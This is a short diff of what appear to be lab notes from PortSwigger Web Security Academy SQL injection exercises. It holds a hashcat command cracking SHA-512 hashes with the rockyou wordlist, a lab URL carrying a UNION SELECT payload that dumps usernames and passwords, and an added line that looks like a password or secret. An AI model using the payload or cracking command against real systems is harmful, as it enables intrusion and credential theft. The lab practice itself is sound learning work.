@@ -6,3 +6,4 @@ hashcat -m 1700 -a 0 password_hashes.txt /usr/share/wordlists/rockyou.txt
 https://ac401f601eb4626a806b2eb0001500c8.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+username,+password+FROM+users--
 https://acac1fc51f5bd5ca80ad095b00ba0092.web-security-academy.net/
 https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
+t9PoXSc$E3f!X]m/:5NSFm}M$Y'f8q$2
